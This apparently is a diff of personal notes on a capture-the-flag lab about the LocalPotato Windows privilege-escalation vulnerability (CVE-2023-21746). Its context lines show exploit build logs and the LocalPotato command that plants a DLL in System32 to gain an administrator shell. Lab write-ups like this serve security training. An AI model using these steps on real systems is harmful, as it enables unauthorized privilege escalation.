@@ -38,7 +38,6 @@ Start the VM before continuing.
 
 Question Done
 
-
 ### NTLM Authentication Refresher
 
  Before going into how the vulnerability works, let's do a quick refresher on NTLM authentication.  
@@ -191,8 +190,6 @@ We are now ready to launch the full exploit chain!
 
 Answer the questions below
 
-![[Pasted image 20230306161104.png]]
-
 ```
 system search
 
@@ -251,7 +248,6 @@ FinalizeBuildStatus:
 Done Building Project "C:\tools\LPE via StorSvc\RpcClient\RpcClient\RpcClient.vcxproj" (default targets).
 
 Done Building Project "C:\tools\LPE via StorSvc\RpcClient\RpcClient.sln" (default targets).
-
 
 Build succeeded.
     0 Warning(s)
@@ -328,7 +324,6 @@ Done Building Project "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vc
 
 Done Building Project "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP.sln" (default targets).
 
-
 Build succeeded.
 
 "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP.sln" (default target) (1) ->
@@ -355,9 +350,7 @@ Time Elapsed 00:00:02.59
 C:\tools\LPE via StorSvc\SprintCSP>move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\
         1 file(s) moved.
 
-
 ```
-
 
 Compile both exploit files and continue.
 
@@ -501,9 +494,7 @@ C:\Users\user\Desktop>copy SprintCSP.dll C:\Windows\System32\SprintCSP.dll
 Access is denied.
         0 file(s) copied.
 
-
 C:\Users\user\Desktop>LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
-
 
          LocalPotato (aka CVE-2023-21746)
          by splinter_code & decoder_it
@@ -572,7 +563,6 @@ C:\Windows\system32>type "C:\users\administrator\desktop\flag.txt"
 THM{local_potatoes_best_potatoes}
 
 ```
-
 
 Elevate your privileges on the system to get an administrative console. What is the value of the flag in `C:\users\administrator\desktop\flag.txt`?
 
@@ -724,7 +714,6 @@ Continue to complete the room.
 
  Completed
 
-
 ### Conclusion
 
 In this room, we have covered how LocalPotato can be weaponized by combining it with a different attack vector to achieve privilege escalation. A brief and simplified explanation of each attack vector was provided, but you can expand on them by reading the original articles for both vulnerabilities:
@@ -737,7 +726,5 @@ Answer the questions below
 Click and continue learning!
 
  Completed
-
-![[Pasted image 20230306170449.png]]
 
 [[Insekube]]
